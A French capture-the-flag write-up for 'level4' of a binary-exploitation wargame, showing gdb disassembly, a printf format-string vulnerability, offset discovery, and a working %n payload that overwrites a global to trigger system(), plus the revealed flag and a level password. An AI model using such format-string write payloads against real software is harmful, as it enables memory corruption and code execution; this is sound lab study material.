# LEVEL 4

On se connecte sur le level4, ou se trouve un **binaire** <code>level4</code>.

On cherche a savoir ce que fait ce binaire:
```gdb
> gdb level4 -q
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
(gdb) > disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret
End of assembler dump.
(gdb) > disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp
   0x08048460 <+9>:     mov    0x8049804,%eax
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>
   0x0804848d <+54>:    mov    0x8049810,%eax
   0x08048492 <+59>:    cmp    $0x1025544,%eax
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret
End of assembler dump.
(gdb) > disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
End of assembler dump.
```

Ici, il est impossible de faire un **buffer overflow** avec le fgets car il prend une taille plus petite que la taille max de notre variable:
> <pre><code>char str[520];
> fgets(str, 512, stdin);</code></pre>

Cependant on peut faire un **Format String Exploit** avec le **printf** comme pour **level3**

On commence par chercher l'**Offset**:

```bash
 > python -c 'print "BBBB" + "|%08x" * 20' | ./level4
BBBB|b7ff26b0|bffff794|b7fd0ff4|00000000|00000000|bffff758|0804848d|bffff550|00000200|b7fd1ac0|b7ff37d0|42424242|3830257c|30257c78|257c7838|7c783830|78383025|3830257c|30257c78|257c7838
```

> Ici le 08 nous permet de forcer l'affichage d'une adresse
>
> Et le 42424242 représente notre B en ASCII

On cherche par la suite l'adresse de **m**:

```gdb
(gdb) i variables
All defined variables:

Non-debugging symbols:
0x08048588  _fp_hw
0x0804858c  _IO_stdin_used
0x080486f8  __FRAME_END__
0x080496fc  __CTOR_LIST__
0x080496fc  __init_array_end
0x080496fc  __init_array_start
0x08049700  __CTOR_END__
0x08049704  __DTOR_LIST__
0x08049708  __DTOR_END__
0x0804970c  __JCR_END__
0x0804970c  __JCR_LIST__
0x08049710  _DYNAMIC
0x080497dc  _GLOBAL_OFFSET_TABLE_
0x080497fc  __data_start
0x080497fc  data_start
0x08049800  __dso_handle
0x08049804  stdin@@GLIBC_2.0
0x08049808  completed.6159
0x0804980c  dtor_idx.6161
0x08049810  m
```

> m = 0x08049810

On sait que l'on cherche 16930116 (0x1025544), donc il nous manque 16930112

```bash
> (python -c 'print "\x10\x98\x04\x08" + "%16930112d" "%12$n"') | ./level4
...
...
-1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```


For download :
<pre><code>scp -P4242 level4@IP:level4 .</code></pre>
> Password : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
